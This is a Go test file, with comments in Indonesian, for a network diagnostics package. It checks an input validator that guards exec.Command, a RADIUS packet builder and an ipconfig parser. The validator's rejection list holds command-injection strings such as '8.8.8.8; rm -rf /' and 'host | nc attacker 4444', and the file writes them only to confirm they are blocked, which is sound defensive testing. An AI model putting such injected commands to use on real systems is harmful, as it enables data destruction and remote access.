package diag

import "testing"

// TestAllowed adalah gerbang keamanan: target yang lolos akan diteruskan ke
// exec.Command sebagai argumen. Kasus injection HARUS ditolak.
func TestAllowed(t *testing.T) {
	valid := []string{
		"8.8.8.8", "google.com", "10.10.10.1:1812", "pelanggan.net:443",
		"https://example.com", "http://10.0.0.1/status", "my-host_1.local",
	}
	for _, v := range valid {
		if !Allowed(v) {
			t.Errorf("Allowed(%q) = false, seharusnya true", v)
		}
	}

	invalid := []string{
		"", "-c", "--help",
		"8.8.8.8 & calc", "8.8.8.8; rm -rf /", "host | nc attacker 4444",
		"$(whoami)", "`id`", "a\nb", "a\rb",
		"8.8.8.8 && ping attacker.com",
		`host"`, "host'",
		"host>out.txt", "host<in.txt",
		"C:\\windows\\system32\\cmd.exe",
	}
	for _, v := range invalid {
		if Allowed(v) {
			t.Errorf("Allowed(%q) = true, seharusnya false (injection!)", v)
		}
	}
}

func TestSplitHostPort(t *testing.T) {
	cases := []struct{ in, host, port string }{
		{"10.0.0.1:1812", "10.0.0.1", "1812"},
		{"google.com", "google.com", "80"},
		{"a.b.c:65535", "a.b.c", "65535"},
	}
	for _, c := range cases {
		h, p := splitHostPort(c.in, "80")
		if h != c.host || p != c.port {
			t.Errorf("splitHostPort(%q) = (%q,%q), mau (%q,%q)", c.in, h, p, c.host, c.port)
		}
	}
}

// TestBuildAccessRequest memastikan paket RADIUS sesuai RFC 2865.
func TestBuildAccessRequest(t *testing.T) {
	pkt := buildAccessRequest("noc-probe")
	if len(pkt) < 20 {
		t.Fatalf("paket terlalu pendek: %d byte", len(pkt))
	}
	if pkt[0] != 1 {
		t.Errorf("Code = %d, mau 1 (Access-Request)", pkt[0])
	}
	length := int(pkt[2])<<8 | int(pkt[3])
	if length != len(pkt) {
		t.Errorf("Length field = %d, panjang nyata = %d", length, len(pkt))
	}
	if pkt[4+16] != 1 {
		t.Errorf("attribute pertama = %d, mau 1 (User-Name)", pkt[4+16])
	}
	attrLen := int(pkt[4+17])
	if attrLen != 2+len("noc-probe") {
		t.Errorf("panjang atribut = %d, mau %d", attrLen, 2+len("noc-probe"))
	}
	if got := string(pkt[4+18:]); got != "noc-probe" {
		t.Errorf("User-Name = %q", got)
	}
}

func TestCondenseIPConfig(t *testing.T) {
	in := "Windows IP Configuration\r\n\r\nEthernet adapter Ethernet:\r\n" +
		"   Description . . . . . . . . . . . : Realtek\r\n" +
		"   IPv4 Address. . . . . . . . . . . : 192.168.1.10\r\n" +
		"   Some Noise Line That Should Drop\r\n" +
		"   Default Gateway . . . . . . . . . : 192.168.1.1\r\n"
	out := condenseIPConfig(in)
	for _, want := range []string{"Ethernet adapter", "IPv4 Address", "Default Gateway"} {
		if !contains(out, want) {
			t.Errorf("output kehilangan %q:\n%s", want, out)
		}
	}
	if contains(out, "Noise Line") {
		t.Errorf("output masih memuat baris sampah:\n%s", out)
	}
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
